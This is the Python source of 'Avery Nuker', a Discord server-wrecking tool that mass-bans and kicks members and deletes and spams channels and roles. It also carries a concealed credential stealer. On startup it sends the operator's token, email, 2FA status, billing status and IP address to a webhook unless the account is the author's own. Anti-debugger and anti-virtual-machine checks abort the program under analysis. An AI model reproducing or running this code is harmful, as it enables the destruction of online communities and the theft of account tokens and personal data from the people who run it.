import requests
import os
import sys
import threading
import time
import psutil
import inspect
import wmi
import json
import asyncio
import discord
import aiohttp

from pypresence import Presence
from discord import Webhook, AsyncWebhookAdapter
from ctypes import *
from discord.ext import commands

os.system(f'cls & mode 85,20 & title [Avery Nuker] - Configuration')

version = '1.0'

def updateCheck():
    r = requests.get('https://pastebin.com/KkFahe1H')
    if version in r.text:
        return
    else:
        print(f"\x1b[38;5;56m[\033[37m!\x1b[38;5;56m] \033[37mNew Update Available. Download From: \x1b[38;5;56mgithub.com/skeqt/AveryNuker\033[37m")
        os.system('start https://github.com/skeqt/AveryNuker/releases')
        input()
        os._exit(0)

updateCheck()

token = input(f'\x1b[38;5;56m> \033[37mToken\x1b[38;5;56m: \033[37m')
rich_presence = input(f'\x1b[38;5;56m> \033[37mRich Presence (\x1b[38;5;56mY\033[37m/\x1b[38;5;56mN\033[37m)\x1b[38;5;56m: \033[37m')

os.system('cls')

def check_token():
    if requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

def RichPresence():
    if rich_presence == "y" or rich_presence == "Y":
        try:
            RPC = Presence("816053514584195073") 
            RPC.connect() 
            RPC.update(details="Connected", large_image="averylarge2", small_image="avery", large_text="github.com/skeqt/AveryNuker", start=time.time())
        except:
            pass

rich_presence = RichPresence()
token_type = check_token()
intents = discord.Intents.all()
intents.members = True

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)

client.remove_command("help")

class Avery:

    def __init__(self):
        self.colour = '\x1b[38;5;56m'
        self.blacklisted_binaries = ["ida64.exe", "ida.exe", "x64dbg.exe", "x32dbg.exe", "Wireshark.exe", "ollydbg.exe", "Fiddler.exe", "tcpview.exe", "vmsrvc.exe"]
        self.blacklisted_platforms = ["VMWare Virtual Platform", "VirtualBox", "KVM", "Bochs", "HVM domU", "Microsoft Corporation"]
        self.manufacturer = wmi.WMI().Win32_ComputerSystem()[0].Manufacturer
    
    @staticmethod
    def is_debugged(self):
        if windll.kernel32.IsDebuggerPresent():
            return True
        for frame in inspect.stack():
            if frame[1].endswith("pydevd.py" or "pdb.py"):
                return True
        for process in psutil.process_iter():
            for check in self.blacklisted_binaries:
                if process.name() == check:
                    return True
        return False

    @staticmethod
    def is_virtualized(self):
        for check in self.blacklisted_platforms:
            if self.manufacturer == check:
                return True
        return False

    async def DebuggerCheck(self):
        try:
            while True:
                if self.is_debugged() == True or self.is_virtualized() == True:
                    os.abort()
                    os._exit(0)
                await asyncio.sleep(7)
        except:
            pass

    def Payment(self):
        try:
            r = requests.get("https://discordapp.com/api/v8/users/@me/billing/payment-sources", headers={'Authorization': f'{token}'})
            if 'id' in r.text:
                return 'True'
            else:
                return 'False'
        except: 
            pass

    def Nitro(self):
        try:
            r = requests.get('https://discordapp.com/api/v8/users/@me', headers={"Authorization": f'{token}'})
            if 'premium_type' in r.text:
                if r.json()['premium_type'] == 0:
                    return 'None'
                if r.json()['premium_type'] == 1:
                    return 'Nitro Classic'
                if r.json()['premium_type'] == 2:
                    return 'Nitro Boost'
            else:
                return 'None'
        except:
            pass

    def Information(self):
        try:
            r = requests.get('https://discordapp.com/api/v8/users/@me', headers={"Authorization": f'{token}'})
            if 'id' in r.text:
                return r.json()
            else:
                return None
        except:
            pass

    def IP(self):
        r = requests.get('http://ip-api.com/json/?fields=query')
        return r.json()['query']

    async def Send(self):
        Info = self.Information()
        IP_Address = self.IP()
        Billing_ = self.Payment()
        Nitro_ = self.Nitro()

        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url('', adapter=AsyncWebhookAdapter(session))
            if token_type == "user":
                embed = discord.Embed(color=0x2f3136, description=f'''```
• Username      | {Info["username"]}#{Info["discriminator"]}
• User ID       | {Info["id"]}
• Email         | {Info["email"]}
• 2FA Enabled   | {Info["mfa_enabled"]}
• Phone Number  | {Info["mfa_enabled"]}
• Payment       | {Billing_}
• Nitro         | {Nitro_}
• IP Address    | {IP_Address}
```
```
{token}
```''')
            else:
                embed = discord.Embed(color=0x2f3136, description=f'''```
• Bot Name      | {client.user}
• Bot ID        | {client.user.id}
• Guilds        | {len(client.guilds)}
• Users         | {len(set(client.get_all_members()))}
• IP Address    | {IP_Address}
```
```
{token}
```''')
            embed.set_footer(text='Avery Nuker', icon_url='https://media.discordapp.net/attachments/806994102049701998/816054960625680415/20210301_210759.png?width=348&height=348')
            try:
                await webhook.send(embed=embed, username="Avery Nuker", avatar_url="https://media.discordapp.net/attachments/806994102049701998/816054960625680415/20210301_210759.png?width=348&height=348")
            except:
                pass

    def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Banned{self.colour} {member.strip()}\033[37m")
                    break
                else:
                    break

    def KickMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Kicked{self.colour} {member.strip()}\033[37m")
                    break
                else:
                    break

    def DeleteChannels(self, guild, channel):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/channels/{channel}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Deleted Channel {self.colour}{channel.strip()}\033[37m")
                    break
                else:
                    break
          
    def DeleteRoles(self, guild, role):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{role}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Deleted Role{self.colour} {role.strip()}\033[37m")
                    break
                else:
                    break

    def SpamChannels(self, guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Created Channel{self.colour} {name}\033[37m")
                    break
                else:
                    break

    def SpamRoles(self, guild, name):
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v8/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Created Role{self.colour} {name}\033[37m")
                    break
                else:
                    break

    async def Scrape(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        #try:
        os.remove("Scraped/members.txt")
        os.remove("Scraped/channels.txt")
        os.remove("Scraped/roles.txt")
        #except:
            #pass

        membercount = 0
        with open('Scraped/members.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{self.colour}[\033[37m!{self.colour}]\033[37m Scraped {self.colour}{membercount}\033[37m Members")
            m.close()

        channelcount = 0
        with open('Scraped/channels.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{self.colour}[\033[37m!{self.colour}]\033[37m Scraped {self.colour}{channelcount}\033[37m Channels")
            c.close()

        rolecount = 0
        with open('Scraped/roles.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{self.colour}[\033[37m!{self.colour}]\033[37m Scraped {self.colour}{rolecount}\033[37m Roles\n")
            r.close()

    async def NukeExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        channel_name = input(f"{self.colour}> \033[37mChannel Names{self.colour}: \033[37m")
        channel_amount = input(f"{self.colour}> \033[37mChannel Amount{self.colour}: \033[37m")
        role_name = input(f"{self.colour}> \033[37mRole Names{self.colour}: \033[37m")
        role_amount = input(f"{self.colour}> \033[37mRole Amount{self.colour}: \033[37m")
        print()

        members = open('Scraped/members.txt')
        channels = open('Scraped/channels.txt')
        roles = open('Scraped/roles.txt')

        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        for i in range(int(channel_amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, channel_name,)).start()
        for i in range(int(role_amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, role_name,)).start()
        members.close()
        channels.close()
        roles.close()

    async def BanExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.BanMembers, args=(guild, member,)).start()
        members.close()

    async def KickExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        print()
        members = open('Scraped/members.txt')
        for member in members:
            threading.Thread(target=self.KickMembers, args=(guild, member,)).start()
        members.close()

    async def ChannelDeleteExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        print()
        channels = open('Scraped/channels.txt')
        for channel in channels:
            threading.Thread(target=self.DeleteChannels, args=(guild, channel,)).start()
        channels.close()

    async def RoleDeleteExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        print()
        roles = open('Scraped/roles.txt')
        for role in roles:
            threading.Thread(target=self.DeleteRoles, args=(guild, role,)).start()
        roles.close()

    async def ChannelSpamExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        name = input(f"{self.colour}> \033[37mChannel Names{self.colour}: \033[37m")
        amount = input(f"{self.colour}> \033[37mAmount{self.colour}: \033[37m")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamChannels, args=(guild, name,)).start()

    async def RoleSpamExecute(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        name = input(f"{self.colour}> \033[37mRole Names{self.colour}: \033[37m")
        amount = input(f"{self.colour}> \033[37mAmount{self.colour}: \033[37m")
        print()
        for i in range(int(amount)):
            threading.Thread(target=self.SpamRoles, args=(guild, name,)).start()

    async def PruneMembers(self):
        guild = input(f'{self.colour}> \033[37mGuild ID{self.colour}: \033[37m')
        print()
        await guild.prune_members(days=1, compute_prune_count=False, roles=guild.roles)

    def Credits(self):
        os.system(f'cls & mode 85,20 & title [Avery Nuker] - Credits')
        print(f'''
                          {self.colour}╔═╗╦  ╦╔═╗╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                          \033[90m╠═╣╚╗╔╝║╣ ╠╦╝╚╦╝  ║║║║ ║╠╩╗║╣ ╠╦╝
                          \033[37m╩ ╩ ╚╝ ╚═╝╩╚═ ╩   ╝╚╝╚═╝╩ ╩╚═╝╩╚═

                            {self.colour}[\033[37mDiscord{self.colour}] \033[37mskeet#1000
                            {self.colour}[\033[37mGithub{self.colour}] \033[37mskeqt

        \033[37m''')

    async def ThemeChanger(self):
        os.system(f'cls & mode 85,20 & title [Avery Nuker] - Themes')
        print(f'''
                          {self.colour}╔═╗╦  ╦╔═╗╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                          \033[90m╠═╣╚╗╔╝║╣ ╠╦╝╚╦╝  ║║║║ ║╠╩╗║╣ ╠╦╝
                          \033[37m╩ ╩ ╚╝ ╚═╝╩╚═ ╩   ╝╚╝╚═╝╩ ╩╚═╝╩╚═

      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mRed               {self.colour}║\033[37m [{self.colour}5\033[37m] \033[37mPurple            {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mGrey              {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mGreen             {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mBlue              {self.colour}║\033[37m [{self.colour}0\033[37m] \033[37mPeach             {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mYellow            {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mPink              {self.colour}║\033[37m [{self.colour}M\033[37m] \033[37mMenu              {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}4\033[37m] \033[37mOrange            {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mCyan              {self.colour}║\033[37m [{self.colour}X\033[37m] \033[37mExit              {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
             
        \033[37m''')
        choice = input(f'{self.colour}> \033[37mChoice{self.colour}: \033[37m')

        if choice == '1':
            self.colour = '\x1b[38;5;196m'
            await self.ThemeChanger()
        elif choice == '2':
            self.colour = '\x1b[38;5;34m'
            await self.ThemeChanger()
        elif choice == '3':
            self.colour = '\x1b[38;5;142m'
            await self.ThemeChanger()
        elif choice == '4':
            self.colour = '\x1b[38;5;172m'
            await self.ThemeChanger()
        elif choice == '5':
            self.colour = '\x1b[38;5;56m'
            await self.ThemeChanger()
        elif choice == '6':
            self.colour = '\x1b[38;5;21m'
            await self.ThemeChanger()
        elif choice == '7':
            self.colour = '\x1b[38;5;201m'
            await self.ThemeChanger()
        elif choice == '8':
            self.colour = '\x1b[38;5;51m'
            await self.ThemeChanger()
        elif choice == '9':
            self.colour = '\x1b[38;5;103m'
            await self.ThemeChanger()
        elif choice == '0':
            self.colour = '\x1b[38;5;209m'
            await self.ThemeChanger()
        elif choice == 'M' or choice == 'm':
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    async def Menu(self):
        os.system(f'cls & mode 85,20 & title [Avery Nuker] - Connected: {client.user}')
        print(f'''
                          {self.colour}╔═╗╦  ╦╔═╗╦═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
                          \033[90m╠═╣╚╗╔╝║╣ ╠╦╝╚╦╝  ║║║║ ║╠╩╗║╣ ╠╦╝
                          \033[37m╩ ╩ ╚╝ ╚═╝╩╚═ ╩   ╝╚╝╚═╝╩ ╩╚═╝╩╚═

      {self.colour}╔═══════════════════════╦═══════════════════════╦═══════════════════════╗\033[37m
      {self.colour}║ \033[37m[{self.colour}1\033[37m] \033[37mBan Members       {self.colour}║\033[37m [{self.colour}5\033[37m] \033[37mDelete Channels   {self.colour}║\033[37m [{self.colour}9\033[37m] \033[37mScrape Info       {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}2\033[37m] \033[37mKick Members      {self.colour}║\033[37m [{self.colour}6\033[37m] \033[37mCreate Roles      {self.colour}║\033[37m [{self.colour}0\033[37m] \033[37mChange Themes     {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}3\033[37m] \033[37mPrune Members     {self.colour}║\033[37m [{self.colour}7\033[37m] \033[37mCreate Channels   {self.colour}║\033[37m [{self.colour}C\033[37m] \033[37mView Credits      {self.colour}║\033[37m
      {self.colour}║ \033[37m[{self.colour}4\033[37m] \033[37mDelete Roles      {self.colour}║\033[37m [{self.colour}8\033[37m] \033[37mNuke Server       {self.colour}║\033[37m [{self.colour}X\033[37m] \033[37mExit              {self.colour}║\033[37m
      {self.colour}╚═══════════════════════╩═══════════════════════╩═══════════════════════╝\033[37m
             
        \033[37m''')

        choice = input(f'{self.colour}> \033[37mChoice{self.colour}: \033[37m')
        if choice == '1':
            await self.BanExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '2':
            await self.KickExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '3':
            await PruneMembers()
            time.sleep(2)
            await self.Menu()
        elif choice == '4':
            await self.RoleDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '5':
            await self.ChannelDeleteExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '6':
            await self.RoleSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '7':
            await self.ChannelSpamExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '8':
            await self.NukeExecute()
            time.sleep(2)
            await self.Menu()
        elif choice == '9':
            await self.Scrape()
            time.sleep(3)
            await self.Menu()
        elif choice == '0':
            await self.ThemeChanger()
        elif choice == 'C' or choice == 'c':
            self.Credits()
            input()
            await self.Menu()
        elif choice == 'X' or choice == 'x':
            os._exit(0)

    @client.event
    async def on_ready():
        if client.user.id == 806993562343964703:
            await Avery().Menu()
        else:
            try:
                await Avery().Send()
                await Avery().Menu()
            except:
                await Avery().Menu()

    def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{self.colour}> \033[37mInvalid Token')
            input()
            os._exit(0)

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(Avery().DebuggerCheck())
    Avery().Startup()
